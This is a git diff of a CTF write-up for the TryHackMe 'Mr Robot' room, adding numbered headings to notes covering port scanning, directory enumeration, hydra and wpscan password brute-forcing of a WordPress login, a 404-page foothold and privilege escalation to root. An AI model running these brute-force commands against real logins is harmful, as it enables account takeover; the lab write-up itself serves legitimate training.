@@ -1,8 +1,9 @@
 # Mr Robot
 [Play](https://tryhackme.com/room/mrrobot)
 
-## Recon
+## 1. Recon
 
+### 1.1 Port Scanning
 ```
 ❯ nmap -sC -sV -A -T4 10.10.91.137
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 21:55 EST
@@ -24,7 +25,7 @@ PORT    STATE  SERVICE  VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 55.55 seconds
 ```
-
+### 1.2 Web Enumeration
 ```
 ❯ gobuster dir -u 10.10.91.137 -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -x "html,php,txt"
 ===============================================================
@@ -78,6 +79,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 `http://10.10.91.137/0/` shows a blog page. We also see the login option, redirecting us to `/wp-login.php`. No common creds work.
 
+### 1.3 Web Exploration
+
 Looking around more, we have `/license.txt` which has `what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?` lmao, and `/readme` showing: `I like where you head is at. However I'm not going to help you.`
 
 However, in `/robots`, I get:
@@ -101,6 +104,8 @@ log=Elliot&pwd=Elliot&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.91.137%2Fw
 
 Okay. this is how it looks. Time for bruteforcing!
 
+### 1.4 Bruteforcing
+
 Use the command: `❯ hydra -l Elliot -P ../fsocity.dic 10.10.91.137 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"`
 
 Explaination:
@@ -116,7 +121,7 @@ Since this is bruteforce, it'll take time to execute. add `-t` flag to specify n
 
 At this point, I have to mention that I spent a long long time to make it work. It did not. One thing which I should have done the first was to remove duplicates. There's also a tool called `wpscan`. Let's try it out.
 
-
+### 1.5 WPScan
 ```
 ❯ wpscan --url 10.10.91.137 -t 64 -U Elliot -P ~/Desktop/Work/Pen-Testing/fsocity.dic
 _______________________________________________________________
@@ -224,7 +229,7 @@ Progress Time: 00:00:46 <======                                                 
 
 I am very very impressed by the scanner. Not only did it find that `/robots.txt` file fairly quicky, it also gave us the password in a minute! 
 
-## Foothold
+## 2. Foothold
 To get a foothold, we need to figure what we can do with `WordPress`.
 
 `WordPress 4.3.1 running Twenty Fifteen theme.` I did not find issues with this version, that are direct in any way. What I found instead is to mess with the `404` page.
@@ -260,7 +265,7 @@ cat: key-2-of-3.txt: Permission denied
 
 very cute. 
 
-## Priv Esc
+## 3. Priv Esc
 
 Let's first get a proper shell
 ```
@@ -359,4 +364,3 @@ root
 ```
 
 pwned!
-
